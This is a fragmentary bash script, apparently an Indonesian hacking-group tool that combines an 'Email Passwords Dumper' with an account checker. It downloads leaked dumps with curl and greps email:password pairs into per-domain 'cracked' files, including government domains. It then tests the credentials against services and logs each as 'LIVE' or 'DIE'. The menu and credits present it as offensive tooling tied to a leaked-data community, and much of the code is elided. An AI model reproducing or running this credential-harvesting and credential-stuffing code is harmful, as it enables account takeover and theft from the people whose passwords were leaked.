...
do
  ...
  dump=$(curl -s "$link")
  for i in gmail yahoo aol hotmail @live @uol @orange .fr .com.br .co.jp .net .de .ru .au .mx .uk .in .id .ca .ar .sg .es .it .gov.il .nsa.gov .nasa.gov 
   do 
...
for akun in gmail yahoo aol hotmail others @live @uol @orange .fr .com.br .co.jp .net .de .ru .au .mx .uk .in .id .ca .ar .sg .es .it .gov.il .nsa.gov .nasa.gov
do
...
do
  echo -e "Dump : ${O}$link${N}"
  dump=$(curl -s "$link")
  for i in gmail yahoo aol hotmail @live @uol @orange .fr .com.br .co.jp .net .de .ru .au .mx .uk .in .id .ca .ar .sg .es .it
   do 
     echo "$dump" | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*[\:\|\ : \::]*[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $i >> $i.txt
     echo -e "[+] ${G}`wc -l $i.txt`${N}"
   done
...
for akun in gmail yahoo aol hotmail others @live @uol @orange .fr .com.br .co.jp .net .de .ru .au .mx .uk .in .id .ca .ar .sg .es .it 
do
  cat $akun.txt | sort | uniq -i >> cracked-$akun.txt
done
}
...
for akun in gmail yahoo aol hotmail others @live @uol @orange .fr .com.br .co.jp .net .de .ru .au .mx .uk .in .id .ca .ar .sg .es .it .gov.il
do
  cat $akun.txt | sort | uniq -i >> cracked-$akun.txt
done
}
      ...
      then
        ...
        then
           ...
           then
              ...
              then
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}]${O} Failed captcha => $email$del$pass ${N}|${O} Checked By RSecxXx.iD & Agus Hackpath_Tools"
              else
                 echo "LIVE => $email$del$pass" >> $acc-$list.txt
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked By RSecxXx.iD & Agus Hackpath_Tools"
              fi
           else
              echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => $email$del$pass ${N}|${R} Checked By RSecxXx.iD & Agus Hackpath_Tools"
              echo "bad" >> .0-$list
           fi
        else
          if [[ "$get" = "" ]]
           then  
                if [[ "$hash" = "y" ]];then
                   ...
                   echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => ${R}$email$del$pass ${N}|${R} Checked By RSecxXx.iD & Agus Hackpath_Tools"
...
if [[ "$hash" = "y" ]];then
   ...
   echo -e "-------[ checked RSecxXx7.ID & by Agus Hackpath Tools checker ]--------\n" >> $acc-$list
   echo -e "${N}[*] Done.....\n[+] Result : ${G}$acc-$list${N}"
...
░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░ ▒▓▒ ░▓   ▒▒▓  ▒ 
  ...
  ░░   ░ ░  ░  ░     ░   ░         ░    ░   ░    ░   ░    ░   ░    ▒ ░ ░ ░  ░ 
   ░           ░     ░  ░░ ░       ░    ░   ░    ░   ░    ░    ░   ░     ░    
       ...
       `date`
Email Checker && Opensource Email Passwords Dumper In Pro Version
           have a nice day Salam Hacker Patah Hati $N
[?] ${G}RSecxXx7.ID TOOLS PRO MENU${N}
...
[9]. Email Passwords Dumper V1
[10]. Email Passwords Dumper V2
[11]. All Source Email Passwords Dumper Pro
[12]. ABOUT RSecxXx7.iD & Agus HackPath TOOLS CLI PRO"
echo -n "your choise ?? "
read d
case $d in
 1) amz="y"
 ...
 ;;
 12) echo -e "
         |${G} HACKPATH TOOLS CLI PRO VERSION ${N}|
...
-THANKS TO ||GREYHAT SCHOOL OF HACKERS && INDONESIAN SYNDICATE && INDONESIAN SECURITY ENGGINERING||
-CoD3d By./Agus Hackpath 
-Contact Email : riobeatdownjr@gmail.com WhatsApp : +6282327075609

Get All New Version Contact Me RSecxXx7.iD & Agus_Hackpath
Thx to:${O} GreyHat School Of Hacker & Hacker Patah Hati - Leaked Data Community${N}"
  ;;
   *) echo -e "[+] Thx for using this tools"
 ;;
esac
